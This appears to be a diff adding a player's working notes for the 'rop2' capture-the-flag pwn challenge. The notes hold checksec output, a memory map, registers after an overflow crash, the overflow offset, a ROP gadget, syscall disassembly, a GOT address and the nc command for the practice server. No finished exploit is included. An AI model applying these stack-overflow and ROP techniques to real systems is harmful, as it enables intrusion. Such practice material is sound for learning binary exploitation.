@@ -1,0 +1,83 @@
+[*] '/home/vagrant/pwn/CTF/hackme_inndy/pwn/rop2/rop2'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+
+gdb-peda$ vmmap
+Start      End        Perm	Name
+0x08048000 0x08049000 r-xp	/home/vagrant/pwn/CTF/hackme_inndy/pwn/rop2/rop2
+0x08049000 0x0804a000 r--p	/home/vagrant/pwn/CTF/hackme_inndy/pwn/rop2/rop2
+0x0804a000 0x0804b000 rw-p	/home/vagrant/pwn/CTF/hackme_inndy/pwn/rop2/rop2
+0x0804b000 0x0804c000 rw-p	[heap]
+0xf7e21000 0xf7e22000 rw-p	mapped
+0xf7e22000 0xf7fca000 r-xp	/lib32/libc-2.19.so
+0xf7fca000 0xf7fcc000 r--p	/lib32/libc-2.19.so
+0xf7fcc000 0xf7fcd000 rw-p	/lib32/libc-2.19.so
+0xf7fcd000 0xf7fd0000 rw-p	mapped
+0xf7fda000 0xf7fdb000 rw-p	mapped
+0xf7fdb000 0xf7fdc000 r-xp	[vdso]
+0xf7fdc000 0xf7ffc000 r-xp	/lib32/ld-2.19.so
+0xf7ffc000 0xf7ffd000 r--p	/lib32/ld-2.19.so
+0xf7ffd000 0xf7ffe000 rw-p	/lib32/ld-2.19.so
+0xfffdd000 0xffffe000 rw-p	[stack]
+
+---
+EAX: 0x400
+EBX: 0xf7701000 --> 0x1a9da8
+ECX: 0xffb1129c ("flag.txt")
+EDX: 0x400
+ESI: 0x0
+EDI: 0x0
+EBP: 0x41414141 ('AAAA')
+ESP: 0xffb112b0 --> 0xa ('\n')
+EIP: 0x42424242 ('BBBB')
+
+regs when crashoff
+
+---
+0x41434141 found at offset: 16
+---
+dbg exp:
+b *0x08048486
+c
+
+
+---
+gadgets:
+
+0x08048578 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+---
+<syscall>
+0xf7679820 <+0>:	    push   ebp
+   0xf7679821 <+1>:	    push   edi
+   0xf7679822 <+2>:	    push   esi
+   0xf7679823 <+3>:	    push   ebx
+   0xf7679824 <+4>:	    mov    ebp,DWORD PTR [esp+0x2c]
+   0xf7679828 <+8>:	    mov    edi,DWORD PTR [esp+0x28]
+=> 0xf767982c <+12>:	mov    esi,DWORD PTR [esp+0x24]
+   0xf7679830 <+16>:	mov    edx,DWORD PTR [esp+0x20]
+   0xf7679834 <+20>:	mov    ecx,DWORD PTR [esp+0x1c]
+   0xf7679838 <+24>:	mov    ebx,DWORD PTR [esp+0x18]
+   0xf767983c <+28>:	mov    eax,DWORD PTR [esp+0x14]
+   0xf7679840 <+32>:	call   DWORD PTR gs:0x10
+   0xf7679847 <+39>:	pop    ebx
+   0xf7679848 <+40>:	pop    esi
+   0xf7679849 <+41>:	pop    edi
+   0xf767984a <+42>:	pop    ebp
+   0xf767984b <+43>:	cmp    eax,0xfffff001
+   0xf7679850 <+48>:	jae    0xf7679853 <syscall+51>
+   0xf7679852 <+50>:	ret
+   0xf7679853 <+51>:	call   0xf76b802f
+   0xf7679858 <+56>:	add    ecx,0xc27a8
+   0xf767985e <+62>:	mov    ecx,DWORD PTR [ecx-0xdc]
+   0xf7679864 <+68>:	neg    eax
+   0xf7679866 <+70>:	mov    DWORD PTR gs:[ecx],eax
+   0xf7679869 <+73>:	or     eax,0xffffffff
+   0xf767986c <+76>:	ret
+
+0x0804a014 = _syscall@GOT
+
+---
+nc hackme.inndy.tw 7703
